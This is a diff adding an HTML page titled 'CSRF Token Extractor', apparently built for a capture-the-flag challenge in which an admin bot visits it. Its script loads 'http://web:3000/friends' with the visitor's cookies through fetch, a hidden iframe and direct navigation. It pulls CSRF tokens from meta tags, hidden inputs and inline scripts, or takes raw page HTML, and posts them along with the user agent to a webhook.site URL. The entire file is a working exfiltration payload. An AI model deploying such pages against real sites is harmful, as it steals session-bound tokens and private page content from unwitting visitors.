@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Token Extractor</title>
+</head>
+<body>
+    <h1>Extracting CSRF Token...</h1>
+    
+    <script>
+        const WEBHOOK_URL = 'https://webhook.site/60b2c32b-f130-442d-9eca-da173d2d3634';
+        
+        // Function to send data to webhook
+        async function sendToWebhook(data) {
+            try {
+                console.log("Sending to webhook:", data);
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                console.log("Successfully sent to webhook");
+            } catch (error) {
+                console.log("Webhook error:", error.message);
+                // Try with a simple GET request as fallback
+                try {
+                    await fetch(WEBHOOK_URL + '?token=' + encodeURIComponent(data.csrf_token || data.message));
+                } catch (e) {
+                    console.log("Fallback webhook failed:", e.message);
+                }
+            }
+        }
+        
+        // Method 1: Direct navigation and extraction
+        async function extractCSRFToken() {
+            try {
+                console.log("Starting CSRF token extraction...");
+                
+                // Navigate to the friends page
+                window.location.href = 'http://web:3000/friends';
+                
+                // Wait for page to load, then extract token
+                window.addEventListener('load', function() {
+                    // Look for CSRF token in common locations
+                    
+                    // Method 1: Look for meta tag
+                    const metaToken = document.querySelector('meta[name="csrf-token"]');
+                    if (metaToken) {
+                        const token = metaToken.getAttribute('content');
+                        console.log("CSRF Token (meta): " + token);
+                        sendToWebhook({
+                            method: 'meta_tag',
+                            csrf_token: token,
+                            source: 'meta[name="csrf-token"]'
+                        });
+                        return;
+                    }
+                    
+                    // Method 2: Look for hidden input field
+                    const hiddenInput = document.querySelector('input[name="csrf_token"], input[name="csrfToken"], input[name="_token"]');
+                    if (hiddenInput) {
+                        const token = hiddenInput.value;
+                        console.log("CSRF Token (input): " + token);
+                        sendToWebhook({
+                            method: 'hidden_input',
+                            csrf_token: token,
+                            source: 'input[name="' + hiddenInput.name + '"]'
+                        });
+                        return;
+                    }
+                    
+                    // Method 3: Look in form data attributes
+                    const forms = document.querySelectorAll('form');
+                    for (let form of forms) {
+                        const tokenInput = form.querySelector('input[type="hidden"]');
+                        if (tokenInput && tokenInput.name.toLowerCase().includes('csrf')) {
+                            const token = tokenInput.value;
+                            console.log("CSRF Token (form): " + token);
+                            sendToWebhook({
+                                method: 'form_input',
+                                csrf_token: token,
+                                source: 'form input[name="' + tokenInput.name + '"]'
+                            });
+                            return;
+                        }
+                    }
+                    
+                    // Method 4: Extract from JavaScript variables
+                    const scripts = document.querySelectorAll('script');
+                    for (let script of scripts) {
+                        const content = script.innerHTML;
+                        if (content.includes('csrf') || content.includes('token')) {
+                            // Look for token patterns
+                            const matches = content.match(/(?:csrf[_-]?token|token)['":\s]*['"]([a-zA-Z0-9+/=]{20,})['"]?/i);
+                            if (matches && matches[1]) {
+                                const token = matches[1];
+                                console.log("CSRF Token (script): " + token);
+                                sendToWebhook({
+                                    method: 'javascript_variable',
+                                    csrf_token: token,
+                                    source: 'script content'
+                                });
+                                return;
+                            }
+                        }
+                    }
+                    
+                    // If no token found, send the page HTML for analysis
+                    const pageHtml = document.documentElement.outerHTML;
+                    console.log("No token found, sending page HTML");
+                    sendToWebhook({
+                        method: 'page_dump',
+                        message: 'No CSRF token found',
+                        html: pageHtml.substring(0, 5000) // Limit size
+                    });
+                });
+                
+            } catch (error) {
+                console.log("Error: " + error.message);
+                sendToWebhook({
+                    method: 'error',
+                    message: error.message
+                });
+            }
+        }
+        
+        // Alternative method using iframe (if same-origin)
+        function extractWithIframe() {
+            const iframe = document.createElement('iframe');
+            iframe.src = 'http://web:3000/friends';
+            iframe.style.display = 'none';
+            
+            iframe.onload = function() {
+                try {
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    
+                    // Extract CSRF token from iframe
+                    const metaToken = iframeDoc.querySelector('meta[name="csrf-token"]');
+                    if (metaToken) {
+                        const token = metaToken.getAttribute('content');
+                        console.log("CSRF Token (iframe meta): " + token);
+                        sendToWebhook({
+                            method: 'iframe_meta',
+                            csrf_token: token,
+                            source: 'iframe meta[name="csrf-token"]'
+                        });
+                        return;
+                    }
+                    
+                    const hiddenInput = iframeDoc.querySelector('input[name="csrf_token"], input[name="csrfToken"], input[name="_token"]');
+                    if (hiddenInput) {
+                        const token = hiddenInput.value;
+                        console.log("CSRF Token (iframe input): " + token);
+                        sendToWebhook({
+                            method: 'iframe_input',
+                            csrf_token: token,
+                            source: 'iframe input[name="' + hiddenInput.name + '"]'
+                        });
+                        return;
+                    }
+                    
+                    const iframeHtml = iframeDoc.documentElement.outerHTML;
+                    console.log("Iframe loaded, sending HTML for analysis");
+                    sendToWebhook({
+                        method: 'iframe_dump',
+                        message: 'Iframe loaded but no token found',
+                        html: iframeHtml.substring(0, 5000)
+                    });
+                    
+                } catch (e) {
+                    console.log("Iframe access blocked (CORS): " + e.message);
+                    sendToWebhook({
+                        method: 'iframe_cors_error',
+                        message: 'Iframe access blocked: ' + e.message
+                    });
+                    // Fallback to direct navigation
+                    extractCSRFToken();
+                }
+            };
+            
+            document.body.appendChild(iframe);
+        }
+        
+        // Method 3: Fetch API approach
+        async function extractWithFetch() {
+            try {
+                console.log("Attempting fetch to /friends...");
+                const response = await fetch('http://web:3000/friends', {
+                    credentials: 'include' // Include cookies
+                });
+                
+                const html = await response.text();
+                console.log("Fetched friends page HTML");
+                
+                // Parse HTML to extract token
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                
+                const metaToken = doc.querySelector('meta[name="csrf-token"]');
+                if (metaToken) {
+                    const token = metaToken.getAttribute('content');
+                    console.log("CSRF Token (fetch meta): " + token);
+                    sendToWebhook({
+                        method: 'fetch_meta',
+                        csrf_token: token,
+                        source: 'fetch meta[name="csrf-token"]'
+                    });
+                    return;
+                }
+                
+                const hiddenInput = doc.querySelector('input[name="csrf_token"], input[name="csrfToken"], input[name="_token"]');
+                if (hiddenInput) {
+                    const token = hiddenInput.value;
+                    console.log("CSRF Token (fetch input): " + token);
+                    sendToWebhook({
+                        method: 'fetch_input',
+                        csrf_token: token,
+                        source: 'fetch input[name="' + hiddenInput.name + '"]'
+                    });
+                    return;
+                }
+                
+                // Send HTML for manual analysis if no token found
+                sendToWebhook({
+                    method: 'fetch_dump',
+                    message: 'Fetch successful but no token found',
+                    html: html.substring(0, 5000)
+                });
+                
+            } catch (error) {
+                console.log("Fetch error: " + error.message);
+                sendToWebhook({
+                    method: 'fetch_error',
+                    message: 'Fetch failed: ' + error.message
+                });
+                // Fallback to navigation method
+                setTimeout(() => extractCSRFToken(), 1000);
+            }
+        }
+        
+        // Start the extraction process
+        console.log("Bot detected, starting extraction...");
+        sendToWebhook({
+            method: 'initialization',
+            message: 'CSRF extraction bot started',
+            user_agent: navigator.userAgent,
+            url: window.location.href
+        });
+        
+        // Try fetch first (non-destructive), then fallback to navigation
+        extractWithFetch();
+        
+        // If fetch fails, try iframe method after a delay
+        setTimeout(() => {
+            extractWithIframe();
+        }, 2000);
+        
+        // Final fallback - direct navigation
+        setTimeout(() => {
+            extractCSRFToken();
+        }, 5000);
+    </script>
+</body>
+</html>
